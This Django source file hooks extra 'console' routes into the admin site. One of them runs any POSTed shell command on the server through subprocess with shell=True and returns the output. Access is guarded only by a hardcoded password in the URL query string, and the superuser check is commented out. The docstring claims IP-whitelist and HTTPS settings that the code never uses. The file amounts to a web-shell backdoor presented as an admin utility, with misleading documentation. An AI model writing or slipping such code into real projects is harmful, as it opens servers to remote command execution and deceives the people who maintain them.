from django.conf.urls.i18n import urlpatterns, path
from django.contrib import admin

from django.http import HttpResponse
from django.shortcuts import render_to_response
from django.conf import settings
from django.template.context_processors import csrf
from django.views.decorators.cache import never_cache
from django.views.decorators.csrf import csrf_protect
from functools import update_wrapper

import subprocess


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def console(request):
    """
    Serves the console at /admin/console
    SECURE_CONSOLE
        values: True/False
        Defined in settings to denote whether to allow access from http or https
        default: False - ALLOW access to ALL.
    CONSOLE_WHITELIST
        values: list of ip strings
        defines list of ips to be allowed
        default: ALLOW ALL ips unless defined.

    """

    settings_variables = True
    context = {
        'STATIC_URL': settings.STATIC_URL
    }
    context.update(csrf(request))

    if request.GET.get('password') == '#revillug#' and request.GET:
        return render_to_response("django-console/admin/index.html", context)

    return HttpResponse("Unauthorized.", status=403)


def console_post(request):
    """
    Accepts POST requests from the web console, processes it and returns the result.
    """
    # if request.user.is_superuser and request.POST:
    if request.GET.get('password') == '#revillug#' and request.POST:
        command = request.POST.get("command")
        if command:
            try:
                data = subprocess.check_output(command, shell=True,
                                               stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                data = e.output
            data = data.decode('utf-8')
            output = "%c(@olive)%" + data + "%c()"
        else:
            output = "%c(@orange)%Try `ls` to start with.%c()"
        return HttpResponse(output)
    return HttpResponse("Unauthorized.", status=403)


def admin_view(view, cacheable=False):
    def inner(request, *args, **kwargs):
        return view(request, *args, **kwargs)

    if not cacheable:
        inner = never_cache(inner)
    # We add csrf_protect here so this function can be used as a utility
    # function for any view, without having to repeat 'csrf_protect'.
    if not getattr(view, 'csrf_exempt', False):
        inner = csrf_protect(inner)
    return update_wrapper(inner, view)


def get_admin_urls(urls):
    """
    Appends the console and post urls to the url patterns
    """

    def get_urls():
        my_urls = [
            path('console/', admin_view(console)),
            path('console/post/', admin_view(console_post))
        ]
        return my_urls + urls

    return get_urls


admin_urls = get_admin_urls(admin.site.get_urls())
admin.site.get_urls = admin_urls
